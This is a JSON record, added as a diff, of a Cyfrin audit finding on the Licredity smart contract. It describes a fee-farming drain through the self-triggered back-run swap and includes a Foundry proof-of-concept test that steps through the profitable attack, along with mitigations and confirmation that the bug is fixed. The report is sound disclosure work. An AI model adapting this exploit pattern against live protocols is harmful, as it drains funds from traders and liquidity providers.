@@ -1,0 +1,55 @@
+{
+    "id": 62349,
+    "kind": "MARKDOWN",
+    "auditfirm_id": 11,
+    "impact": "HIGH",
+    "finders_count": 3,
+    "protocol_id": 3402,
+    "title": "Self-triggered `Licredity::_afterSwap` back-run enables LP fee farming",
+    "content": "**Description:** When price hits or goes below 1, [`Licredity::_afterSwap`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L734-L753) auto back-runs a swap to push price up:\n```solidity\nif (sqrtPriceX96 <= ONE_SQRT_PRICE_X96) {\n    // back run swap to revert the effect of the current swap, using exactOut to account for fees\n    IPoolManager.SwapParams memory params =\n        IPoolManager.SwapParams(false, -balanceDelta.amount0(), MAX_SQRT_PRICE_X96 - 1);\n    balanceDelta = poolManager.swap(poolKey, params, \"\");\n```\nThat back-run pays swap fees to LPs. An attacker who provides most of the liquidity around 1 can:\n\n1. push price slightly below 1 with a swap and earn back their swap fees as LP fees,\n2. trigger the hook’s back-run and earn LP fees again,\n3. redeem via `Licredity::exchangeFungible` at \\~1:1 (using `baseAmountAvailable` / `debtAmountOutstanding`),\n   so they recover their principal while keeping both fee legs. This can be looped by the same account.\n\n\n**Impact:** A dominant LP can repeatedly mine fees with low price risk, draining value from traders and the system’s stabilization logic. Over time this becomes a steady, repeatable extraction (economic drain) whenever the attacker can steer price just under 1.\n\n**Proof of Concept:** Add the following test to `LicredityHook.t.sol`:\n```solidity\nfunction test_abuse_backswap_fees() public {\n    address attacker = makeAddr(\"attacker\");\n\n    // fund attacker with ETH and mint some debt for LP positions\n    vm.deal(attacker, 1000 ether);\n    getDebtERC20(attacker, 50 ether);\n\n    vm.startPrank(attacker);\n    IERC20(address(licredity)).approve(address(uniswapV4Router), type(uint256).max);\n\n    // 1) Attacker adds dominant narrow liquidity around parity on BOTH sides:\n    //    below 1  -> captures fees while price dips (push leg + back-run leg)\n    //    above 1  -> recoups the tiny portion of fees paid just above 1 when crossing\n    int256 L_below = 40_000 ether;\n    int256 L_above = 10_000 ether;\n\n    // Record attacker balances before attack\n    uint256 baseBefore = attacker.balance;\n    uint256 debtBefore = IERC20(address(licredity)).balanceOf(attacker);\n\n    // below 1: [-2, 0]\n    uniswapV4RouterHelper.addLiquidity(\n        attacker,\n        poolKey,\n        IPoolManager.ModifyLiquidityParams({\n            tickLower: -2,\n            tickUpper:  0,\n            liquidityDelta: L_below,\n            salt: \"\"\n        })\n    );\n\n    // above 1: [0, +2]\n    payable(address(uniswapV4Router)).transfer(1 ether);\n    uniswapV4RouterHelper.addLiquidity(\n        attacker,\n        poolKey,\n        IPoolManager.ModifyLiquidityParams({\n            tickLower: 0,\n            tickUpper: 2,\n            liquidityDelta: L_above,\n            salt: \"\"\n        })\n    );\n    vm.stopPrank();\n\n    // 2) Ensure starting price is a hair > 1 so we cross down through 1 on the push.\n    //    Do a tiny oneForZero (debt -> base) to nudge price up.\n    uniswapV4RouterHelper.oneForZeroSwap(\n        attacker,\n        poolKey,\n        IPoolManager.SwapParams({\n            zeroForOne: false,                        // debt -> base\n            amountSpecified: int256(0.001 ether),     // exact-in (tiny)\n            sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(3)\n        })\n    );\n    {\n        (uint160 sqrtP0,,,) = poolManager.getSlot0(poolKey.toId());\n        assertGt(sqrtP0, ONE_SQRT_PRICE_X96, \"price should start slightly > 1\");\n    }\n\n    vm.startPrank(attacker);\n    // 3) The attacker does the push: base -> debt (zeroForOne), exact-out debt,\n    //    with a limit just below 1 so we do cross into price<=1 and trigger the hook’s back-run.\n    int256 debtOut = 2 ether;\n    for(uint256 i = 0 ; i < 1 ; i++) {\n        payable(address(uniswapV4Router)).transfer(uint256(debtOut));\n        uniswapV4RouterHelper.zeroForOneSwap(\n            attacker,\n            poolKey,\n            IPoolManager.SwapParams({\n                zeroForOne: true,                              // base -> debt\n                amountSpecified: -debtOut,                     // exact-out debt\n                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(-3)\n            })\n        );\n    }\n    // hook's back-run (debt -> base, exact-out base) runs inside afterSwap\n\n    // Price should be restored to >= 1 by the hook’s back-run\n    {\n        (uint160 sqrtP1,,,) = poolManager.getSlot0(poolKey.toId());\n        assertGe(sqrtP1, ONE_SQRT_PRICE_X96, \"post back-run price must be >= 1\");\n    }\n\n    // 4) Pull the fees: remove BOTH attacker positions to collect base + debt fees.\n    uniswapV4RouterHelper.removeLiquidity(\n        attacker,\n        poolKey,\n        IPoolManager.ModifyLiquidityParams({\n            tickLower: -2,\n            tickUpper:  0,\n            liquidityDelta: -L_below,\n            salt: \"\"\n        })\n    );\n    uniswapV4RouterHelper.removeLiquidity(\n        attacker,\n        poolKey,\n        IPoolManager.ModifyLiquidityParams({\n            tickLower: 0,\n            tickUpper: 2,\n            liquidityDelta: -L_above,\n            salt: \"\"\n        })\n    );\n    vm.stopPrank();\n\n    // Attacker balances AFTER\n    uint256 baseAfter = attacker.balance;\n    uint256 debtAfter = IERC20(address(licredity)).balanceOf(attacker);\n\n    // 5) Value both legs ~at parity (1 debt ~= 1 base). Because the price is ~1,\n    //    this notional comparison is a good proxy for profit from the fee mining.\n    uint256 notionalBefore = baseBefore + debtBefore;\n    uint256 notionalAfter  = baseAfter  + debtAfter;\n\n    // Expect positive drift from:\n    //  - near-100% recoup of taker fees (attacker dominates both sides around 1)\n    //  - plus back-run fees (paid in debt) captured below 1\n    assertGt(notionalAfter, notionalBefore, \"drain should be profitable when attacker dominates both sides\");\n    console.log(\"Profit from fee mining drain: %s\", notionalAfter - notionalBefore);\n}\n```\n\n**Recommended Mitigation:** Consider one of the following options:\n1. Remove the back-run and revert swaps that would end below 1, or reject `sqrtPriceLimitX96` below 1.\n2. Only allow whitelisted addresses to provide liquidity in ticks below 1.\n3. Use dynamic fees in the hook and don't accrue fees for the back-run (i.e `sender == address(this)`).\n\n**Licredity:** Fixed in [PR#61](https://github.com/Licredity/licredity-v1-core/pull/61/files) and [PR#78](https://github.com/Licredity/licredity-v1-core/pull/78/files), commits [`ddee552`](https://github.com/Licredity/licredity-v1-core/commit/ddee552ce5c1343ed0de1630776655f5313324bb), [`f10c969`](https://github.com/Licredity/licredity-v1-core/commit/f10c969621b2228bee0838ccf3fd597b8b51cef3), [`d8522f8`](https://github.com/Licredity/licredity-v1-core/commit/d8522f8a5b656791536bd87142b2a553ea0b8def), [`039eb4a`](https://github.com/Licredity/licredity-v1-core/commit/039eb4ab5f5c1775d889c9465dde39d22902f583), [`f818f33`](https://github.com/Licredity/licredity-v1-core/commit/f818f335a1f023cac450af4560baf1f0c75c1334), and [`0baca20`](https://github.com/Licredity/licredity-v1-core/commit/0baca209b1cfee61d92b0bde11a1cdf99d2436fe)\n\n**Cyfrin:** Verified. Swaps with a price ending up below 1 now reverts. `exchangeFungible` also changed to always provide a 1:1 exchange rate, as long as there is an exchangeable amount in the contract.",
+    "summary": "\nThe bug report describes a vulnerability in the Licredity smart contract that allows a dominant liquidity provider (LP) to repeatedly mine fees without taking on much price risk. The bug allows the LP to push the price of an asset below 1 and then trigger a back-run swap that pays fees to the LP. The LP can then redeem their position at a 1:1 exchange rate, effectively extracting value from the system. This can be done repeatedly, causing a steady drain on the system's value. A proof of concept is provided, along with a recommended mitigation strategy. The bug has been fixed in the Licredity code. ",
+    "report_date": "2025-09-01T00:00:00.000Z",
+    "contest_prize_txt": "",
+    "contest_link": "",
+    "sponsor_name": null,
+    "sponsor_link": "",
+    "quality_score": 5,
+    "general_score": 0,
+    "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-09-01-cyfrin-licredity-v2.0.md",
+    "github_link": "",
+    "pdf_link": "",
+    "pdf_page_from": 0,
+    "contest_id": "",
+    "slug": "self-triggered-licredity_afterswap-back-run-enables-lp-fee-farming-cyfrin-none-licredity-markdown",
+    "firm_name": "Cyfrin",
+    "firm_logo_square": "Cyfrin_square.jpg",
+    "protocol_name": "Licredity",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "Immeas"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Alexzoid"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "ChainDefenders](https://x.com/ChDefendersEth) ([0x539](https://x.com/1337web3) & [PeterSR"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Cyfrin",
+        "logo_square": "Cyfrin_square.jpg"
+    },
+    "protocols_protocol": {
+        "name": "Licredity",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
